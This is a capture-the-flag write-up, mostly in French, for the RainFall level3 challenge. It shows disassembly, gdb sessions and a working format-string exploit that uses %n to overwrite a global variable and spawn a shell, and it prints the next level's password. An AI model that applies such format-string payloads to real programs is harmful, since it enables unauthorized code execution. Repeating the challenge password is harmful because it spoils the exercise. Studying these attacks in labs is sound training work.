https://cs155.stanford.edu/papers/formatstring-1.2.pdf
https://www.theflash2k.me/blog/ctf-techs/fsb-guide

==========================================================================================

commande:
    objdump -D level3 | grep "<m>"

result:
    0804988c <m>:

==========================================================================================
commande:
    disas v

result:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)				|--> mov 0x200 into $esp+0x4
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax 			|--> Mon buffer commmence ici | load the addr at $ebp-0x208 in $eax
   0x080484d2 <+46>:	mov    %eax,(%esp)					|--> put the value of the addr in $eax into %esp
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>		|--> print the buffer
   0x080484da <+54>:	mov    0x804988c,%eax				|--> put the value in 0x804988c into $eax
=> 0x080484df <+59>:	cmp    $0x40,%eax					|--> compare the value in $eax to 0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret

   %p et %n prennent des nombres afin de decrire ce qu'il affiche / ecrit
   %4$p -> affiche la position 4 du buffer

==========================================================================================

Se referer au script.py python creer. Il permet de creer un payload de %p avec leur index afin de trouver le debut du buffer
le buffer commence a index 4

commande:
    python /tmp/payload.py | ./level3

result:
    AAAA|1=0x200|2=0xb7fd1ac0|3=0xb7ff37d0|4=0x41414141|5=0x253d317c|6=0x7c702431|7=0x32253d32|8=0x337c7024|9=0x2433253d|10=0x3d347c70|11=0x70243425|12=0x253d357c|13=0x7c702435|14=0x36253d36|15=0x377c7024

===========================================================================================

payload:
    python -c 'print "\x8c\x98\x04\x08%4p%64x%4$n"' > /tmp/payload

result in gdb:
    (gdb) b *0x080484d5
    Breakpoint 1 at 0x80484d5
    (gdb) r < /tmp/payload
    Starting program: /home/user/level3/level3 < /tmp/payload

    Breakpoint 1, 0x080484d5 in v ()
    (gdb) info register
    eax            0xbffff520	-1073744608
    ecx            0xb7fda010	-1208115184
    edx            0xb7fd28c4	-1208145724
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff510	0xbffff510
    ebp            0xbffff728	0xbffff728
    esi            0x0	0
    edi            0x0	0
    eip            0x80484d5	0x80484d5 <v+49>
    eflags         0x200286	[ PF SF IF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    (gdb) watch m
    Hardware watchpoint 2: m
    (gdb) ni
    Hardware watchpoint 2: m

    Old value = 0
    New value = 73
    0xb7e71e2f in vfprintf () from /lib/i386-linux-gnu/libc.so.6
    (gdb)


==========================================================================================

new playload + output out of gdb
    level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/payload
    level3@RainFall:~$ ./level3 < /tmp/payload
    �                                                         200
    Wait what?!


==========================================================================================

Final command to get shell:
    (cat /tmp/payload; cat;) | ./level3
password obtenue dans /home/user/level4/.pass: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

























https://man7.org/linux/man-pages/man3/printf.3.html

BUGS         top

       Code such as printf(foo); often indicates a bug, since foo may
       contain a % character.  If foo comes from untrusted user input, it
       may contain %n, causing the printf() call to write to memory and
       creating a security hole.


https://cs155.stanford.edu/papers/formatstring-1.2.pdf

D'apres la doc, je peux faire crash le programe:

	3.2 Crash of the program

We can easily trigger some invalid pointer access by just supplying a format string like:

	printf ("%s%s%s%s%s%s%s%s%s%s%s%s");

level3@RainFall:~$ ./level3
%s%s%s%s%s%s%s%s%s%s%s%s
Segmentation fault (core dumped)

comme prevus, ca crash.

Ensuite on lis:
			‘%n’ parameter, which can be used to write to the addresses on the stack
			If that is done a few times, it should reliably produce a crash, too.


						printf ("%n%n%n%n%n%n%n%n%n%n%n%n");
On va essayer d'ecrire sur la stack:

level3@RainFall:~$ ./level3
%n%n%n%n%n%n%n%n%n%n%n%n
Segmentation fault (core dumped)

Je me demande ce qui est ecris sur la stack concretement :/


	3.3 Viewing the process memory
		3.3.1 Viewing the stack

			We can show some parts of the stack memory by using a format string like this:

					printf ("%08x.%08x.%08x.%08x.%08x\n");

Testons:


/*

	Notes:
	format: elf32-i386

	functions founded:
		int m = 0; -> variable globale address probable: 0x0804988c

		main(void) { // address de debut: 0x804851a
			v();
			return;
		}

		v(void) {
			char buffer[520];
			fgets(buffer, 512, stdin);
			printf(buffer);
			if (m == 64) {
				fwrite("Wait what ?!\n", 1, 12, stdout);
				system("/bin/sh");
			}
			return;
		}

		frame_dummy(void) { return; }

================================================================================

pour trouver m:

objdump -D level3 | grep <m>

Result:
0804988c <m>:

ou on peut le voir a la ligne de comparaison dans la fonction v:

0x080484da <+54>:    mov    0x804988c,%eax  -> 0x804988c c'est l'address de m
0x080484df <+59>:    cmp    $0x40,%eax

================================================================================

Payload pour voir la stack ( limiter a 512 char a cause du fgets:

%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p


================================================================================

	main:
		0x0804851a <+0>:	push   %ebp
		0x0804851b <+1>:	mov    %esp,%ebp // on met le contenue de ebp dans esp
		0x0804851d <+3>:	and    $0xfffffff0,%esp // filtre pour garder seulement le dernier bit ?
		0x08048520 <+6>:	call   0x80484a4 <v> // call to V (function)
		0x08048525 <+11>:	leave
		0x08048526 <+12>:	ret

================================================================================

	v:
		0x080484a4 <+0>:	push   %ebp
		0x080484a5 <+1>:	mov    %esp,%ebp
		0x080484a7 <+3>:	sub    $0x218,%esp
		0x080484ad <+9>:	mov    0x8049860,%eax
		0x080484b2 <+14>:	mov    %eax,0x8(%esp)
		0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
		0x080484be <+26>:	lea    -0x208(%ebp),%eax
		0x080484c4 <+32>:	mov    %eax,(%esp)
		0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
		0x080484cc <+40>:	lea    -0x208(%ebp),%eax
		0x080484d2 <+46>:	mov    %eax,(%esp)
		0x080484d5 <+49>:	call   0x8048390 <printf@plt>
		0x080484da <+54>:	mov    0x804988c,%eax
		0x080484df <+59>:	cmp    $0x40,%eax
		0x080484e2 <+62>:	jne    0x8048518 <v+116>
		0x080484e4 <+64>:	mov    0x8049880,%eax
		0x080484e9 <+69>:	mov    %eax,%edx
		0x080484eb <+71>:	mov    $0x8048600,%eax
		0x080484f0 <+76>:	mov    %edx,0xc(%esp)
		0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
		0x080484fc <+88>:	movl   $0x1,0x4(%esp)
		0x08048504 <+96>:	mov    %eax,(%esp)
		0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
		0x0804850c <+104>:	movl   $0x804860d,(%esp)
		0x08048513 <+111>:	call   0x80483c0 <system@plt>
		0x08048518 <+116>:	leave
		0x08048519 <+117>:	ret

================================================================================

	frame_dummy:
		0x08048480 <+0>:	push   %ebp
		0x08048481 <+1>:	mov    %esp,%ebp
		0x08048483 <+3>:	sub    $0x18,%esp
		0x08048486 <+6>:	mov    0x8049748,%eax
		0x0804848b <+11>:	test   %eax,%eax
		0x0804848d <+13>:	je     0x80484a1 <frame_dummy+33>
		0x0804848f <+15>:	mov    $0x0,%eax
		0x08048494 <+20>:	test   %eax,%eax
		0x08048496 <+22>:	je     0x80484a1 <frame_dummy+33>
		0x08048498 <+24>:	movl   $0x8049748,(%esp)
		0x0804849f <+31>:	call   *%eax
		0x080484a1 <+33>:	leave
		0x080484a2 <+34>:	ret
		0x080484a3 <+35>:	nop
*/
